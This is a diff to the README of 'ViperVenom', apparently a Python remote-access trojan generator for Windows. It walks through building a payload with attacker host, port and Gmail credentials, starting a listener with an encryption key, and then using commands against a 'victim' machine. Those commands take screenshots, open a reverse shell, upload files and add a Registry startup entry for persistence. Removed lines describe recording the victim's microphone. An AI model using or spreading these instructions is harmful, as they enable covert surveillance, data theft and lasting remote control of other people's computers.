@@ -68,7 +68,7 @@ In this section, you will be able to generate your own ViperVenom Python payload
 
 First, run the tool
 ```
-python3 vipervenom.py
+python3 main.py
 ```
 You should be brought to the starting page, to show the list, type "show list" or "list", to see the available options.
 ```
@@ -111,7 +111,6 @@ microphone record seconds, and filename, here's a quick walkthrough
 (Generator) Windows/ViperVenom/TCP/Payload > set port YOURPORT
 (Generator) Windows/ViperVenom/TCP/Payload > set gmailaddr YOURGMAILADDR@gmail.com
 (Generator) Windows/ViperVenom/TCP/Payload > set gmailpass YOURPASSWORD
-(Generator) Windows/ViperVenom/TCP/Payload > set micrecord SECONDS
 (Generator) Windows/ViperVenom/TCP/Payload > set filename YOURFILENAME.py
 (Generator) Windows/ViperVenom/TCP/Payload > set sleep SECONDS
 ```
@@ -125,7 +124,6 @@ PORT=443
 GAMILADDR=revise7@example.com
 GAMILPASS=P@$$W0RD_ON3
 FILENAME=NULL.py
-MICRECORDSECONDS=600
 SLEEP=60
 ```
 To generate the payload
@@ -139,12 +137,7 @@ running build
 running build_exe
 
 ...
-
-[+] To Use This Payload Securely, Use This Unique Key to Start The Listener: b'RG3BR6Q20JRB3yclBtCEhZvQ1250f9SOGq0RWYfDoPQ='
-
-[*] Please Keep This Unique Key in a Safe Place, You Won't Be Able to Run the Listener Without it!
 [*] Done Generating Payload.
-[*] Would You Like to Start Listener?
 ```
 PLEASE store this random key somewhere safe, copy the whole line including the b letter and the quotes and paste it in a note, you'll require this key so the target machine
 will connect back to do, otherwise, 
@@ -197,11 +190,9 @@ After selecting payload, you must set up your host IP and port that you want to 
 EXAMPLE:
 (Listener) Windows/ViperVenom/TCP/Payload > set host YOURIP
 (Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
-(Listener) Windows/ViperVenom/TCP/Payload > set key b'RG3BR6Q20JRB3yclBtCEhZvQ1250f9SOGq0RWYfDoPQ='
 (Listener) Windows/ViperVenom/TCP/Payload > options
 LHOST=YOURIP
 LPORT=YOURPORT
-KEY=b'RG3BR6Q20JRB3yclBtCEhZvQ1250f9SOGq0RWYfDoPQ='
 (Listener) Windows/ViperVenom/TCP/Payload >
 ```
 The key should be the random key you got after generating the payload, copy the whole key including the b letter and the quotes and set it using "set key YOUR KEY"
@@ -226,12 +217,6 @@ $ python3 decode_image.py
 ```
 The screenshot should appear in ViperVenom's Tool folder as a .jpg file.
 ```
-$ mic record
-```
-Records victim's microphone input( if the victim has an available microphone) for an amount of time you set.
-Known bug: You won't be able to type more commands after executing this command, we're working on a fix.
-
-```
 $ shell
 ```
 Get a full interactive reverse shell from your target machine + special commands
@@ -254,7 +239,7 @@ $ upload {file}
 Upload the file from your machine to the target machine, use this command after gaining a shell access only.
 
 ```
-$ startup {file}
+$ persistence {file}
 ```
 Adds a file to Windows Registry startup. Recommended for persistence, use this command after gaining a shell access only.
 ```
